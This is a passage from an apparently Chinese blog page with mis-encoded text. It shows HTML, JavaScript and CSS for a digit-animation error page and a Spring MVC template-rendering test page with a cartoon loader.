class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randomNum</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span>) + <span class="hljs-number">1</span>;</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">var</span> loop1, loop2, loop3, time = <span class="hljs-number">30</span>, i = <span class="hljs-number">0</span>, number;</span><span class="language-javascript">    loop3 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">40</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop3);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">5</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop2 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">80</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop2);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop1 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">100</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop1);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>æˆ‘ç”¨çš„æ¯”è¾ƒéªšçš„ç”¨æ¥æµ‹è¯•æ¨¡ç‰ˆæ¸²æŸ“çš„first.html</p><p>æ³¨æ„æ¨¡ç‰ˆä¸ºÂ¥{}çš„ç±»å‹</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>springMVCæ¨¡ç‰ˆæ¸²æŸ“æµ‹è¯•ç”¨ä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--æ³¨æ„è¿™é‡Œçš„Â¥&#123;&#125;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>I&#x27;m ï¿¥&#123;name&#125;,I like ï¿¥&#123;hobby&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;loader&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;track&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mouse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;face&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ears-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eyes-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eye&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eye&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phiz&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nose&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lip&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mouth&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><span class="language-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Cabin+Sketch:400,700&quot;</span>);</span><span class="language-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Cabin+Sketch:400,700|Open+Sans|Oswald&quot;</span>);</span><span class="language-css"><span class="hljs-selector-class">.title-box</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">margin</span>: auto;</span><span class="language-css"><span class="hljs-attribute">display</span>: block;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: none;</span><span class="language-css"><span class="hljs-attribute">z-index</span>:<span class="hljs-number">999</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-color</span>: transparent;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span> &#123;</span><span class="language-css"><span class="hljs-attribute">color</span>: white;</span><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#6da0e0</span>;</span><span class="language-css"><span class="hljs-attribute">background-repeat</span>: no-repeat;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span><span class="hljs-selector-pseudo">:hover</span>,</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span><span class="hljs-selector-pseudo">:focus</span> &#123;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: bubbles <span class="hljs-number">1s</span> forwards ease-out;</span><span class="language-css"><span class="hljs-attribute">animation</span>: bubbles <span class="hljs-number">1s</span> forwards ease-out;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">52%</span> <span class="hljs-number">125%</span> / <span class="hljs-number">1.2em</span> <span class="hljs-number">1.2em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">67%</span> <span class="hljs-number">133%</span> / <span class="hljs-number">0.66em</span> <span class="hljs-number">0.66em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">64%</span> <span class="hljs-number">93%</span> / <span class="hljs-number">1.17em</span> <span class="hljs-number">1.17em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">22%</span> <span class="hljs-number">88%</span> / <span class="hljs-number">1.04em</span> <span class="hljs-number">1.04em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">43%</span> <span class="hljs-number">95%</span> / <span class="hljs-number">0.87em</span> <span class="hljs-number">0.87em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">97%</span> <span class="hljs-number">116%</span> / <span class="hljs-number">0.62em</span> <span class="hljs-number">0.62em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">62%</span> <span class="hljs-number">97%</span> / <span class="hljs-number">0.64em</span> <span class="hljs-number">0.64em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">87%</span> <span class="hljs-number">135%</span> / <span class="hljs-number">0.68em</span> <span class="hljs-number">0.68em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) -<span class="hljs-number">4%</span> <span class="hljs-number">89%</span> / <span class="hljs-number">0.57em</span> <span class="hljs-number">0.57em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">89%</span> <span class="hljs-number">88%</span> / <span class="hljs-number">0.65em</span> <span class="hljs-number">0.65em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">6%</span> <span class="hljs-number">144%</span> / <span class="hljs-number">0.77em</span> <span class="hljs-number">0.77em</span>;</span><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#6da0e0</span>;</span><span class="language-css"><span class="hljs-attribute">background-repeat</span>: no-repeat;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> bubbles &#123;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background-position</span>: <span class="hljs-number">45%</span> -<span class="hljs-number">182%</span>, <span class="hljs-number">61%</span> -<span class="hljs-number">215%</span>, <span class="hljs-number">62%</span> -<span class="hljs-number">196%</span>, <span class="hljs-number">18%</span> -<span class="hljs-number">318%</span>, <span class="hljs-number">51%</span> -<span class="hljs-number">86%</span>, <span class="hljs-number">88%</span> -<span class="hljs-number">292%</span>, <span class="hljs-number">66%</span> -<span class="hljs-number">244%</span>, <span class="hljs-number">89%</span> -<span class="hljs-number">313%</span>, -<span class="hljs-number">9%</span> <span class="hljs-number">9%</span>, <span class="hljs-number">99%</span> -<span class="hljs-number">107%</span>, <span class="hljs-number">16%</span> -<span class="hljs-number">282%</span>;</span><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> -<span class="hljs-number">6.5em</span> <span class="hljs-number">0</span> <span class="hljs-number">#0072c4</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> bubbles &#123;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background-position</span>: <span class="hljs-number">45%</span> -<span class="hljs-number">182%</span>, <span class="hljs-number">61%</span> -<span class="hljs-number">215%</span>, <span class="hljs-number">62%</span> -<span class="hljs-number">196%</span>, <span class="hljs-number">18%</span> -<span class="hljs-number">318%</span>, <span class="hljs-number">51%</span> -<span class="hljs-number">86%</span>, <span class="hljs-number">88%</span> -<span class="hljs-number">292%</span>, <span class="hljs-number">66%</span> -<span class="hljs-number">244%</span>, <span class="hljs-number">89%</span> -<span class="hljs-number">313%</span>, -<span class="hljs-number">9%</span> <span class="hljs-number">9%</span>, <span class="hljs-number">99%</span> -<span class="hljs-number">107%</span>, <span class="hljs-number">16%</span> -<span class="hljs-number">282%</span>;</span><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> -<span class="hljs-number">6.5em</span> <span class="hljs-number">0</span> <span class="hljs-number">#0072c4</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#10192d</span>;</span><span class="language-css"><span class="hljs-attribute">display</span>: flex;</span><span class="language-css"><span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;</span><span class="language-css"><span class="hljs-attribute">justify-content</span>: center;</span><span class="language-css"><span class="hljs-attribute">align-content</span>: center;</span><span class="language-css"><span class="hljs-attribute">align-items</span>: center;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn</span> &#123;</span><span class="language-css"><span class="hljs-attribute">text-decoration</span>: none;</span><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">2em</span>;</span><span class="language-css"><span class="hljs-attribute">display</span>: block;</span><span class="language-css"><span class="hljs-attribute">text-decoration</span>: none;</span><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">2em</span>;</span><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><span class="language-css"><span class="hljs-attribute">text-align</span>: center;</span><span class="language-css">&#125;</span><span class="language-css"></span><span class="language-css"><span class="hljs-selector-tag">h1</span> &#123;</span><span class="language-css"><span class="hljs-attribute">text-align</span>: center;</span><span class="language-css"><span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Cabin Sketch&#x27;</span>, cursive;</span><span class="language-css"><span class="hljs-attribute">font-size</span>: <span class="hljs-number">90px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0px</span>;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;</span><span class="language-css"><span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-o-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-o-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span 